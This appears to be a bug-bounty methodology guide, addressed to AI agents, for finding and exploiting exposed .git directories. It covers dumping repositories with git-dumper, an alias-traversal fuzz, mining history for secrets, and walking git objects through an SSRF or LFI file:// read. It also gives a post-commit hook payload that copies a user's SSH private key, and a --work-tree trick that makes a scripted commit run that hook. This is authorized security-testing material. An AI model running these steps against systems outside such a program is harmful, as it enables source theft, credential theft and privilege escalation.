---
technology: "Exposed .git directories"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: web-platforms
evidence: "18 writeups (see ../internal coverage ledger)"
provenance: "corpus-mined from 18 writeups in the writeup corpus + upstream-verified 2026-11-12: arthaud/git-dumper README (install + invocation), internetwache/GitTools README + source (Finder greps refs/heads in .git/HEAD; Dumper usage + pack-file caveat; Extractor usage), kost/dvcs-ripper README (rip-git.pl -v -u http://example.com/.git/, auto checkout, svn/hg/cvs siblings). Corpus note: every corpus dump used git-dumper; GitTools/dvcs-ripper/githacker have ZERO corpus invocations — named here as upstream alternatives only. Pass 2 extension 2026-11-12: Phase 5 (write side) added from a writeup that walked .git objects through a file-read API and escalated via a post-commit hook (git-scm hooks/--no-verify/--work-tree semantics verified against git-scm.com docs)."
---

Companion page: [[git-exposed|Exposed .git overview]] — what the surface is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# Exposed .git Bug Bounty Methodology

**Scope:** discovering and exploiting web-exposed git metadata (and its VCS siblings), reconstructing the repository, and mining it for credentials and code intelligence. **Out of scope:** the vulnerabilities found *in* the dumped source (each belongs to its own unit); git servers as services (gitea/gitlab units).

**Authorization:** presume written permission. Dumping is read-only and low-volume by default (git-dumper throttles), but a full history can be large — scope the fetch, and treat any credentials found as demo-only (never use them outside the program's targets).

## Decision tree (one screen)

1. Dir-scan hit on `/.git` or `/.git/HEAD` (or alias-traversal exposure) → Phase 2 (dump).
2. Dump succeeds → `git status` immediately: staged-but-uncommitted changes? → Phase 3 (archaeology).
3. Any commit/config looks interesting → Phase 4 (loot classes).
4. No `.git` → try `.svn/entries`, `.hg/`, source-package zips (Phase 2c).
5. Already on the box → Phase 4d (local `.git/config` read) before anything else.

## Phase 1 — Discovery markers

Directory brute-force with a git-aware wordlist (`/.git/HEAD`, `/.git/config`, `/.git/index`, `/.git/logs/HEAD`):

```text
/.git/HEAD   [Status: 200, Size: 21]        # gate passed — dump will run
/.git/       [Status: 403]                  # expected; directory listing is NOT required
/.git/logs/  [Status: 200]                  # reflog reachable — history beyond HEAD
```

Observed discovery paths: ffuf/feroxbuster/gobuster with SecLists quickhits or common wordlists (301 on `/.git`, seen both in a quickhits fuzz and on a common wordlist); dirb/gobuster finding `/.git/HEAD` on a `/dev` subdir (observed); vhost `dev.`/`blog-dev.` subdomains running the pre-prod copy (two engagements). **Alias off-by-slash**: when nginx `location /assets` aliases into the web root, fuzz `http://example.com/assets../FUZZ` — it exposes `.git`, `.env`, `.dockerignore` at the root (one observed quickhits run found the whole set). Also remember non-HTTP exposure: an SSRF with `file://` reaching `/var/www/app/.git/HEAD` is the same unit, read one file at a time (observed).

## Phase 2 — Dumping

**git-dumper** (the field standard; pip-installable):

```bash
pip3 install git-dumper
git-dumper http://example.com/.git ./repo          # or: git-dumper.py URL outdir (older clones)
git-dumper http://example.com/assets../.git dump   # alias-traversal URL works as the target
```

Output to read: `Testing ... /.git/HEAD [200]`, per-object `Fetching ... [200]` lines, then `Sanitizing .git/config` and `Running git checkout .` — you land a checked-out working tree.

**Alternatives (upstream-verified, zero observed use — know them, say so in reports):** GitTools (internetwache) three-stage — `gitfinder.py` finds `.git/HEAD` containing `refs/heads`, `Dumper/gitdumper.sh http://target/.git/ dest` fetches without directory listing, `Extractor/extractor.sh repo-dir dest-dir` rebuilds per-commit trees from broken/partial dumps via `git cat-file` (use it when git-dumper's checkout fails); dvcs-ripper `rip-git.pl -v -u http://example.com/.git/` (plus `rip-svn.pl`/`rip-hg.pl` for sibling VCS metadata; runs its own `git checkout -f`). Manual fallback: fetch `HEAD` → `refs/heads/<branch>` → commit object → walk `tree`/`parent` links with `git cat-file` after placing objects under `objects/xx/`; fetch `objects/info/packs` + pack files when history is packed (git-dumper's documented blind spot).

**Offline sources need the same handling**: source-package zips containing `.git` (one observed Docker bundle), backup archives (one observed), GlusterFS/rsync-mounted volumes — unpack, then identical Phase 3.

## Phase 3 — Reconstruction and commit archaeology

```bash
cd repo && git status            # FIRST: staged-but-uncommitted delta
git restore --staged . && git diff    # print the staged hunks (observed dumps carried credentials here)
git log --all --oneline          # full history incl. other refs
git show <sha>                   # inspect a named commit
git diff <sha>                   # what a "Security Fixes" commit changed
git reflog; git stash list       # reflog/dangling history if logs/ was fetched
```

Observed archaeology patterns, in value order:

1. **Staged-not-committed changes** — the server snapshot's index holds edits the developer staged but never committed; `git status` shows `new file:`/`modified:` lines and the diff carries the freshest secrets (one observed dump: a modified auth test file + new Dockerfile staged, diff contained working credentials).
2. **Named-commit diffs** — commits titled "Security Fixes", "remove keys", "update deps" are the author labeling the vulnerable version for you: `git diff` that commit to learn the pre-fix code and downgrade-target (one observed dump: one-line mysqljs version bump → the exploitable old version confirmed).
3. **Deleted-file recovery** — anything in history but absent from HEAD (`git log --all --diff-filter=D --summary`) — old configs, keys, `.env` variants — is still fully readable from its blob.
4. **Reflog/branches** — `logs/HEAD` fetched by the dumper exposes rebase/wiped history; `--all` covers leftover branches (wip, hotfix, revert-* names are triage shortcuts).

## Phase 4 — Loot classes

- **`.git/config` (always read it first)** — `[remote "origin"] url =` names the internal git host/subdomain (one observed chain: a `gitea.example.com` reference turned into the privesc path); inline `user`/`password` fields or credential-embedded URLs are direct secrets. Also `.gitmodules` — submodule URLs extend recon to sibling repositories.
- **App config files in the tree** — `.env` (one observed tree: `APP_KEY=base64:...`, `APP_DEBUG=true`), CMS configuration files with DB credentials (the app units' `wp-config`-class files), private keys, `docker-compose.yml` with passwords.
- **Code intelligence** — full source enables the *actual* finding: dependency downgrade targets (observed: mysqljs SQLi), authz logic (review servlet filters/route guards), upload validation, hardcoded internal endpoints (one dumped dev-service source carried a hardcoded command password).
- **Post-shell variant** — no dump needed: `cat /var/www/app/.git/config` for origin/creds (field-observed), or `git log` inside any repo you land next to; distributed packages (one observed bundle) ship `tomcat-users.xml`-class configs *plus* `.git`.

## Phase 5 — The write side: object crafting through file primitives, hook injection

**5.1 Manual object walk when the primitive is a file read, not HTTP.** The dumpers assume `GET /.git/...`; an LFI or SSRF that speaks `file://` reaches the same metadata one file at a time, and the walk has to be done by hand (field-observed with an API-side file read):

```text
file:///var/www/app/.git/HEAD                   → ref: refs/heads/master
file:///var/www/app/.git/refs/heads/master      → <commit sha>
file:///var/www/app/.git/objects/<xx>/<rest>    → zlib-compressed object bytes
```

Assemble the store locally as you fetch: `git init` in a scratch directory, `mkdir .git/objects/<xx>`, then write the raw — still-compressed — object bytes to `.git/objects/<xx>/<rest>` and read them with `git cat-file -p <sha>` to chase the next SHA (commit → tree → subtree → blob). Reverse any transport encoding before writing: APIs that hand you hex or base64 bodies need `xxd -r -p` / `base64 -d` in the pipe, or the "object" you wrote is garbage. The per-object dance is the point — no dumper runs against a file-read primitive, only against HTTP.

**5.2 Hook injection when the primitive is a file write.** Write access to `.git` while the work tree stays locked down is execution-on-commit. Check ACLs first: `getfacl /var/www/app/.git/` — extended permissions routinely grant a service user write to the metadata directory while the checkout itself is root-owned (field-observed). Drop the hook:

```bash
printf '#!/bin/bash\ncat /home/<target-user>/.ssh/id_rsa > /tmp/id_rsa\n' > .git/hooks/post-commit
chmod +x .git/hooks/post-commit
```

Two rules decide which hook and how it fires:

- **`--no-verify` skips `pre-commit` but not `post-commit`.** Wrapper scripts that automate commits often carry the flag precisely to suppress developer hooks — read the wrapper (it usually sits beside the repo in a `scripts/` directory and names the user it commits as) and prefer `post-commit` whenever it is set.
- **A hook only fires when a commit actually happens.** If the tree is clean and you cannot create files in the work tree, stage the change from outside it: `git --work-tree=<any-dir-you-can-write> add -A` pulls foreign files into the index (mirror the wrapper's own `--git-dir`/`--work-tree` invocation), so the next scripted `git commit` runs your hook — as the user the wrapper commits as. SSH-key theft and reverse shells are the same payload away.

Cron- or API-driven `git commit` wrappers ("commit from the deploy", "commited from API") are exactly the privilege boundary this crosses: the wrapper runs as a named service user, and the hook rides it for free.

## Disclosure notes

- The exposure itself is the reportable finding even if the tree is clean: remote source + history disclosure, rated by what the history held (credentials = critical; clean marketing site = low/informational).
- Document the gate evidence (the 200s on `.git/HEAD` et al.) — many programs dispute "no listing" as "not exposed"; object-file readability is the standard.
- Credentials found: report location (file, commit SHA, staged-vs-committed) and verify only within scope; staged-but-uncommitted secrets deserve explicit callout (they never even reached the repo the owner thinks they audited).

## Appendix A — Tool mapping (prose)

- **git-dumper** (arthaud; pip `git-dumper`) — field-default dumper: walks HEAD→objects, sanitizes config, auto-checkout.
- **GitTools** (internetwache; Finder/Dumper/Extractor) — finder + dumper + broken-repo extractor for pack-file cases.
- **dvcs-ripper** (kost) — perl ripper for git and the sibling VCS dirs (svn/hg/bzr/cvs).
- **git itself** — `status`, `restore --staged`, `diff`, `log --all`, `show`, `reflog`, `cat-file` — where the actual value is extracted.
- **ffuf / feroxbuster / gobuster / dirb** — discovery with git-path wordlists; remember the `assets../` alias-traversal fuzz pattern.
- **curl/wget** — manual object fetching and the `file://` SSRF variant.
- **xxd / base64** — reversing transport encodings (hex, base64 response bodies) when walking objects through a file-read API (Phase 5).
- **jd-gui-class decompilers** — when the dumped source is a Java build (see the tomcat unit's registry-exfil pattern).
